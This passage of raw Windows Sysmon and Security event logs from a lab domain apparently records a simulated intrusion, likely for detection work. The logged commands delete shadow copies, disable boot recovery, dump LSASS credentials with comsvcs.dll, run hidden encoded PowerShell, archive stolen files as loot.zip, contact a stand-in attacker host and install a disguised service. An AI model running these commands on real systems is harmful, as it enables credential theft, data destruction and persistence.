Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=A9C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c wmic /node:10.0.1.15 process call create</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:50.442901500Z'/><EventRecordID>184289</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4028'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:50.442</Data><Data Name='ProcessGuid'>{a2359ba1-8cdb-609c-4002-000000000e00}</Data><Data Name='ProcessId'>2216</Data><Data Name='Image'>C:\Windows\System32\wbem\WMIC.exe</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.1.24</Data><Data Name='SourceHostname'>WIN-DC-01.attackrange.local</Data><Data Name='SourcePort'>50201</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.1.15</Data><Data Name='DestinationHostname'>WIN-WORKSTATION.attackrange.local</Data><Data Name='DestinationPort'>135</Data><Data Name='DestinationPortName'>epmap</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:57.107733900Z'/><EventRecordID>184298</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:57.107</Data><Data Name='ProcessGuid'>{a2359ba1-8ce2-609c-4402-000000000e00}</Data><Data Name='ProcessId'>6820</Data><Data Name='Image'>C:\Windows\System32\vssadmin.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Command Line Interface for Microsoft Volume Shadow Copy Service</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>VSSADMIN.EXE</Data><Data Name='CommandLine'>vssadmin delete shadows /all /quiet</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c vssadmin delete shadows /all /quiet</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:57.663219700Z'/><EventRecordID>184300</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:57.663</Data><Data Name='ProcessGuid'>{a2359ba1-8ce3-609c-4802-000000000e00}</Data><Data Name='ProcessId'>4472</Data><Data Name='Image'>C:\Windows\System32\bcdedit.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Boot Configuration Data Editor</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>bcdedit.exe</Data><Data Name='CommandLine'>bcdedit /set {default} recoveryenabled No</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c bcdedit /set {default} recoveryenabled No</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:03.118904200Z'/><EventRecordID>994512</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='88'/><Channel>Security</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-2547128611-1795869445-1994594412-1108</Data><Data Name='SubjectUserName'>svc_backup</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0x1c7735</Data><Data Name='NewProcessId'>0x1b44</Data><Data Name='NewProcessName'>C:\Windows\System32\rundll32.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x1868</Data><Data Name='CommandLine'>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 664 C:\Users\svc_backup\AppData\Local\Temp\lsass.dmp full</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='MandatoryLabel'>S-1-16-12288</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:03.771254800Z'/><EventRecordID>994518</EventRecordID><Correlation/><Execution ProcessID='664' ThreadID='712'/><Channel>Security</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-0-0</Data><Data Name='SubjectUserName'>-</Data><Data Name='SubjectDomainName'>-</Data><Data Name='SubjectLogonId'>0x0</Data><Data Name='TargetUserSid'>S-1-5-21-2547128611-1795869445-1994594412-1108</Data><Data Name='TargetUserName'>svc_backup</Data><Data Name='TargetDomainName'>ATTACKRANGE</Data><Data Name='TargetLogonId'>0x9f3d21</Data><Data Name='LogonType'>3</Data><Data Name='LogonProcessName'>NtLmSsp</Data><Data Name='AuthenticationPackageName'>NTLM</Data><Data Name='WorkstationName'>WIN-DC-01</Data><Data Name='LogonGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ProcessName'>-</Data><Data Name='IpAddress'>10.0.1.24</Data><Data Name='IpPort'>50201</Data><Data Name='ImpersonationLevel'>%%1833</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12548</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:03.772881000Z'/><EventRecordID>994519</EventRecordID><Correlation/><Execution ProcessID='664' ThreadID='712'/><Channel>Security</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-2547128611-1795869445-1994594412-1108</Data><Data Name='SubjectUserName'>svc_backup</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0x9f3d21</Data><Data Name='PrivilegeList'>SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:04.331567700Z'/><EventRecordID>994523</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='88'/><Channel>Security</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-2547128611-1795869445-1994594412-1108</Data><Data Name='SubjectUserName'>svc_backup</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0x9f3d21</Data><Data Name='NewProcessId'>0x1d2c</Data><Data Name='NewProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x2f0</Data><Data Name='CommandLine'>cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\wbem\WmiPrvSE.exe</Data><Data Name='MandatoryLabel'>S-1-16-16384</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:04.889334100Z'/><EventRecordID>184318</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:15:04.889</Data><Data Name='ProcessGuid'>{b3460cb2-8ce4-609c-4c02-000000000e00}</Data><Data Name='ProcessId'>7452</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{b3460cb2-8ce3-609c-213d-9f0000000000}</Data><Data Name='LogonId'>0x9f3d21</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7</Data><Data Name='ParentProcessGuid'>{b3460cb2-8ce3-609c-4800-000000000e00}</Data><Data Name='ParentProcessId'>752</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:10.552118400Z'/><EventRecordID>184327</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:15:10.552</Data><Data Name='ProcessGuid'>{b3460cb2-8cea-609c-5002-000000000e00}</Data><Data Name='ProcessId'>3320</Data><Data Name='Image'>C:\Windows\System32\net.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>net.exe</Data><Data Name='CommandLine'>net user administrator /domain</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{b3460cb2-8ce3-609c-213d-9f0000000000}</Data><Data Name='LogonId'>0x9f3d21</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7D9</Data><Data Name='ParentProcessGuid'>{b3460cb2-8ce4-609c-4c02-000000000e00}</Data><Data Name='ParentProcessId'>7452</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:16.774339500Z'/><EventRecordID>184336</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:15:16.774</Data><Data Name='ProcessGuid'>{b3460cb2-8cf0-609c-5402-000000000e00}</Data><Data Name='ProcessId'>2884</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell -c "Compress-Archive -Path C:\Users\svc_backup\AppData\Local\Temp\*.hive,C:\Users\svc_backup\AppData\Local\Temp\lsass.dmp -DestinationPath C:\Users\svc_backup\AppData\Local\Temp\loot.zip"</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{b3460cb2-8ce3-609c-213d-9f0000000000}</Data><Data Name='LogonId'>0x9f3d21</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7D9A1</Data><Data Name='ParentProcessGuid'>{b3460cb2-8ce4-609c-4c02-000000000e00}</Data><Data Name='ParentProcessId'>7452</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:23.331778100Z'/><EventRecordID>184345</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4028'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:15:23.331</Data><Data Name='ProcessGuid'>{b3460cb2-8cf0-609c-5402-000000000e00}</Data><Data Name='ProcessId'>2884</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.1.15</Data><Data Name='SourceHostname'>WIN-WORKSTATION.attackrange.local</Data><Data Name='SourcePort'>51120</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>203.0.113.66</Data><Data Name='DestinationHostname'>c2cdn.attacker-infra.example</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:29.552991200Z'/><EventRecordID>184354</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:15:29.552</Data><Data Name='ProcessGuid'>{b3460cb2-8cf7-609c-5802-000000000e00}</Data><Data Name='ProcessId'>6040</Data><Data Name='Image'>C:\Windows\System32\sc.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Service Control Manager Configuration Tool</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sc.exe</Data><Data Name='CommandLine'>sc create WinDefendUpd binPath= "cmd /c powershell -nop -w hidden -enc SQBFAFgA" start= auto</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{b3460cb2-8ce3-609c-213d-9f0000000000}</Data><Data Name='LogonId'>0x9f3d21</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7D9A1C3</Data><Data Name='ParentProcessGuid'>{b3460cb2-8ce4-609c-4c02-000000000e00}</Data><Data Name='ParentProcessId'>7452</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:15:30.118443700Z'/><EventRecordID>184357</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4044'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-WORKSTATION.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2021-05-13 09:15:30.118</Data><Data Name='ProcessGuid'>{b3460cb2-8cf7-609c-5802-000000000e00}</Data><Data Name='ProcessId'>6040</Data><Data Name='Image'>C:\Windows\System32\services.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\WinDefendUpd\ImagePath</Data><Data Name='Details'>cmd /c powershell -nop -w hidden -enc SQBFAFgA</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
